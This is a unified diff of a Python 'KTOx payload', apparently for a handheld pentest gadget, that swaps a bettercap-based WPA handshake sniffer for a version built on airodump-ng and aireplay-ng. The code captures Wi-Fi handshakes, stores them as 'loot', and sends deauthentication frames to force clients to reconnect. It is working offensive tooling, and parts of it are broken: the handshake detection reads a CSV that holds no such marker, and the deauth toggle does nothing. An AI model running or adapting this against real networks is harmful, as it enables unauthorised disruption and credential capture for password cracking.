@@ -1,27 +1,22 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – Pwnagotchi (Bettercap Edition) with Loot Saving
-===============================================================
-Author: wickednull
-
-Automated WPA handshake sniffer with Tamagotchi-style LCD.
-Saves captured handshakes to /root/KTOx/loot/Handshakes/
+KTOx Payload – Pwnagotchi Fallback (No API)
+=============================================
+This version does NOT require the bettercap API.
+It uses airodump-ng directly to scan and capture handshakes.
 
 Controls:
-  OK        – force deauth on selected AP
-  KEY1      – toggle auto-deauth mode (not fully implemented)
-  KEY2      – show handshake log
-  KEY3      – exit
+  KEY1 – toggle deauth mode (auto-deauth on new clients)
+  KEY2 – show handshake log
+  KEY3 – exit
 """
 
 import os
 import sys
 import time
-import json
-import threading
 import subprocess
-import requests
-import shutil
+import threading
+import re
 from datetime import datetime
 
 # ----------------------------------------------------------------------
@@ -66,7 +61,7 @@ def draw_screen(lines, title="PWNAGOTCHI", title_color="#8B0000", text_color="#F
         d.text((4,y), line[:23], font=f9, fill=text_color)
         y += 12
     d.rectangle((0,H-12,W,H), fill="#220000")
-    d.text((4,H-10), "OK=deauth  K1=auto  K2=log  K3=exit", font=f9, fill="#FF7777")
+    d.text((4,H-10), "K1=deauth  K2=log  K3=exit", font=f9, fill="#FF7777")
     LCD.LCD_ShowImage(img,0,0)
 
 def wait_btn(timeout=0.1):
@@ -80,151 +75,105 @@ def wait_btn(timeout=0.1):
     return None
 
 # ----------------------------------------------------------------------
-# Loot directories
+# Directories
 # ----------------------------------------------------------------------
 LOOT_DIR = "/root/KTOx/loot/Handshakes"
 os.makedirs(LOOT_DIR, exist_ok=True)
 HANDSHAKE_LOG = os.path.join(LOOT_DIR, "handshake_log.txt")
 
 # ----------------------------------------------------------------------
-# Bettercap REST API configuration
-# ----------------------------------------------------------------------
-BETTERCAP_HOST = "127.0.0.1"
-BETTERCAP_PORT = 8081
-API_URL = f"http://{BETTERCAP_HOST}:{BETTERCAP_PORT}/api"
-
-SESSION_URL = f"{API_URL}/session"
-WIFI_URL = f"{API_URL}/wifi"
-EVENTS_URL = f"{API_URL}/events"
-
 # Global state
+# ----------------------------------------------------------------------
 handshake_count = 0
-last_handshake_time = None
 ap_count = 0
-mood = "normal"
-auto_deauth = True
-bettercap_process = None
+handshake_log = []       # for LCD display
 running = True
-interface = "wlan0mon"
-handshake_log = []       # list of strings for LCD display
-bettercap_pcap = "/root/bettercap-wifi-handshakes.pcap"  # default location
+mon_interface = None
+deauth_mode = False
+current_target_bssid = None
 
-def set_mood(new_mood):
-    global mood
-    mood = new_mood
-    if new_mood == "happy":
-        threading.Timer(3.0, lambda: set_mood("normal") if mood == "happy" else None).start()
-    elif new_mood == "glitch":
-        threading.Timer(1.0, lambda: set_mood("normal") if mood == "glitch" else None).start()
+# ----------------------------------------------------------------------
+# airodump-ng background thread
+# ----------------------------------------------------------------------
+airodump_proc = None
+handshake_detected = False
+handshake_info = ""
 
-def save_handshake(bssid, essid, client):
+def find_monitor_interface():
+    result = subprocess.run("iw dev", shell=True, capture_output=True, text=True)
+    for line in result.stdout.splitlines():
+        if "Interface" in line and "mon" in line:
+            return line.split()[1]
+    return None
+
+def start_airodump():
+    global airodump_proc, mon_interface, ap_count
+    mon_interface = find_monitor_interface()
+    if not mon_interface:
+        draw_screen(["No monitor interface", "Run: airmon-ng start wlan0"], title="ERROR")
+        return False
+    cmd = f"airodump-ng --output-format csv -w /tmp/ktox_capture {mon_interface}"
+    airodump_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return True
+
+def parse_airodump():
+    global ap_count, handshake_detected, handshake_info
+    csv_file = "/tmp/ktox_capture-01.csv"
+    last_handshake_check = 0
+    while running:
+        if os.path.exists(csv_file):
+            with open(csv_file, errors="ignore") as f:
+                lines = f.readlines()
+            # Count APs (lines with BSSID)
+            aps = [l for l in lines if re.match(r"([0-9A-Fa-f]{2}:){5}", l)]
+            ap_count = len(aps)
+            # Check for handshake notification in airodump-ng output
+            for line in lines:
+                if "WPA handshake" in line:
+                    now = time.time()
+                    if now - last_handshake_check > 5:
+                        last_handshake_check = now
+                        # Extract BSSID and ESSID
+                        parts = line.split(",")
+                        if len(parts) >= 6:
+                            bssid = parts[0].strip()
+                            essid = parts[13].strip() if len(parts) > 13 else "unknown"
+                            handshake_detected = True
+                            handshake_info = f"{essid} ({bssid})"
+                            # Save the handshake file
+                            save_handshake(bssid, essid)
+        time.sleep(2)
+
+def save_handshake(bssid, essid):
     global handshake_count, handshake_log
     handshake_count += 1
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    # Sanitize ESSID for filename
     safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30]
     if not safe_essid:
         safe_essid = "unknown"
-    filename = f"{safe_essid}_{timestamp}.pcap"
-    dest_path = os.path.join(LOOT_DIR, filename)
-    # Copy the handshake file if it exists
-    if os.path.exists(bettercap_pcap):
-        shutil.copy2(bettercap_pcap, dest_path)
-        # Also append to log file
+    src_pcap = "/tmp/ktox_capture-01.cap"
+    if os.path.exists(src_pcap):
+        dest_pcap = os.path.join(LOOT_DIR, f"{safe_essid}_{timestamp}.pcap")
+        subprocess.run(f"cp {src_pcap} {dest_pcap}", shell=True)
         with open(HANDSHAKE_LOG, "a") as logf:
-            logf.write(f"{timestamp} | BSSID: {bssid} | ESSID: {essid} | Client: {client} | File: {filename}\n")
-    # Update LCD log
+            logf.write(f"{timestamp} | BSSID: {bssid} | ESSID: {essid} | File: {dest_pcap}\n")
     log_entry = f"{timestamp[-5:]} {essid[:10]}"
     handshake_log.insert(0, log_entry)
     if len(handshake_log) > 5:
         handshake_log.pop()
-    set_mood("happy")
-
-# ----------------------------------------------------------------------
-# Bettercap control
-# ----------------------------------------------------------------------
-def start_bettercap():
-    global bettercap_process, interface
-    # Find monitor interface
-    result = subprocess.run("iw dev", shell=True, capture_output=True, text=True)
-    for line in result.stdout.splitlines():
-        if "Interface" in line and "mon" in line:
-            interface = line.split()[1]
-            break
-    if not interface:
-        draw_screen(["No monitor interface", "Run airmon-ng first"], title="ERROR")
-        return False
-    # Start bettercap with REST API and handshake saving
-    cmd = [
-        "bettercap", "-eval",
-        f"set api.rest true; set api.rest.username ''; set api.rest.password ''; "
-        f"wifi.recon on; wifi.show.sort clients desc; wifi.handshakes.file {bettercap_pcap}; "
-        f"events.stream off; set wifi.interface {interface}; wifi.recon on"
-    ]
-    bettercap_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(3)
-    try:
-        r = requests.get(SESSION_URL, timeout=2)
-        if r.status_code != 200:
-            raise Exception("API not responding")
-    except:
-        draw_screen(["Bettercap API failed", "Check bettercap"], title="ERROR")
-        return False
-    return True
-
-def stop_bettercap():
-    global bettercap_process
-    if bettercap_process:
-        bettercap_process.terminate()
-        bettercap_process.wait(timeout=2)
-        bettercap_process = None
-
-def get_wifi_data():
-    try:
-        r = requests.get(WIFI_URL, timeout=2)
-        if r.status_code == 200:
-            return r.json()
-    except:
-        pass
-    return None
 
 def send_deauth(bssid):
-    try:
-        payload = {"bssid": bssid}
-        r = requests.post(f"{WIFI_URL}/deauth", json=payload, timeout=2)
-        if r.status_code == 200:
-            set_mood("glitch")
-            return True
-    except:
-        pass
+    if bssid and mon_interface:
+        subprocess.run(f"aireplay-ng --deauth 1 -a {bssid} {mon_interface}", shell=True, capture_output=True)
+        return True
     return False
 
-def get_events():
-    try:
-        r = requests.get(EVENTS_URL, timeout=2)
-        if r.status_code == 200:
-            events = r.json()
-            for ev in events:
-                if "handshake" in ev.get("tag", "").lower():
-                    data = ev.get("data", {})
-                    bssid = data.get("bssid", "unknown")
-                    essid = data.get("essid", "unknown")
-                    client = data.get("client", "unknown")
-                    # Only save if we have a valid handshake
-                    if bssid != "unknown" and essid != "unknown":
-                        save_handshake(bssid, essid, client)
-    except:
-        pass
-
 # ----------------------------------------------------------------------
-# Drawing character
+# Drawing
 # ----------------------------------------------------------------------
 def draw_character(draw, mood):
     if mood == "happy":
         eye_color = "#00FF00"
-        mouth = (58, 65, 70, 70)
-    elif mood == "glitch":
-        eye_color = "#FF00FF"
         mouth = (58, 65, 70, 70)
     else:
         eye_color = "#00AAFF"
@@ -235,14 +184,13 @@ def draw_character(draw, mood):
     draw.rectangle(mouth, outline="#FF3300", width=1)
     draw.line((64, 30, 64, 22), fill="#FF00AA", width=1)
     draw.ellipse((62, 18, 66, 22), fill="#FF00AA")
-    if mood == "glitch":
-        draw.rectangle((50, 35, 78, 55), outline="#FF00FF", width=1)
 
 def update_display():
-    global ap_count
-    data = get_wifi_data()
-    if data:
-        ap_count = len(data.get("aps", []))
+    global handshake_detected, handshake_info
+    mood = "happy" if handshake_detected else "normal"
+    if handshake_detected:
+        # Reset after 3 seconds
+        threading.Timer(3, lambda: globals().update(handshake_detected=False)).start()
     uptime = int(time.time() - start_time)
     # Custom drawing
     img = Image.new("RGB", (W, H), "#0A0000")
@@ -255,14 +203,12 @@ def update_display():
     y += 12
     d.text((4,y), f"Uptime: {uptime}s", font=f9, fill="#FFBBBB")
     y += 12
-    d.text((4,y), f"Auto: {'ON' if auto_deauth else 'OFF'}", font=f9, fill="#FFBBBB")
-    y += 12
-    d.text((4,y), f"Mood: {mood.upper()}", font=f9, fill="#FFBBBB")
+    d.text((4,y), f"Deauth: {'ON' if deauth_mode else 'OFF'}", font=f9, fill="#FFBBBB")
     # Character
     draw_character(d, mood)
     # Footer
     d.rectangle((0,H-12,W,H), fill="#220000")
-    d.text((4,H-10), "OK=deauth  K1=auto  K2=log  K3=exit", font=f9, fill="#FF7777")
+    d.text((4,H-10), "K1=deauth  K2=log  K3=exit", font=f9, fill="#FF7777")
     LCD.LCD_ShowImage(img,0,0)
 
 def show_log():
@@ -276,57 +222,30 @@ def show_log():
         time.sleep(0.05)
 
 # ----------------------------------------------------------------------
-# Background event loop
-# ----------------------------------------------------------------------
-def event_loop():
-    while running:
-        get_events()
-        time.sleep(1)
-
-# ----------------------------------------------------------------------
 # Main
 # ----------------------------------------------------------------------
 start_time = time.time()
 
 def main():
-    global auto_deauth, running
-    if not start_bettercap():
-        draw_screen(["Bettercap failed", "KEY3 to exit"], title="ERROR")
-        while wait_btn(0.5) != "KEY3":
-            pass
+    global deauth_mode, running, current_target_bssid
+    if not start_airodump():
         return
-
-    threading.Thread(target=event_loop, daemon=True).start()
-
+    threading.Thread(target=parse_airodump, daemon=True).start()
     while running:
         update_display()
         btn = wait_btn(0.5)
         if btn == "KEY3":
             break
-        elif btn == "OK":
-            data = get_wifi_data()
-            if data and data.get("aps"):
-                bssid = data["aps"][0].get("bssid")
-                if bssid:
-                    send_deauth(bssid)
-                    draw_screen([f"Deauth sent to {bssid}"], title="DEAUTH")
-                    time.sleep(1)
-            else:
-                draw_screen(["No APs to deauth"], title="DEAUTH")
-                time.sleep(1)
         elif btn == "KEY1":
-            auto_deauth = not auto_deauth
-            draw_screen([f"Auto-deauth: {'ON' if auto_deauth else 'OFF'}"], title="SETTING")
-            time.sleep(0.5)
+            deauth_mode = not deauth_mode
+            draw_screen([f"Deauth mode: {'ON' if deauth_mode else 'OFF'}"], title="SETTING")
+            time.sleep(1)
         elif btn == "KEY2":
             show_log()
         time.sleep(0.05)
-
-    stop_bettercap()
+    if airodump_proc:
+        airodump_proc.terminate()
     GPIO.cleanup()
-    draw_screen(["Pwnagotchi stopped", "KEY3 to exit"], title="EXIT")
-    while wait_btn(0.5) != "KEY3":
-        pass
 
 if __name__ == "__main__":
     main()
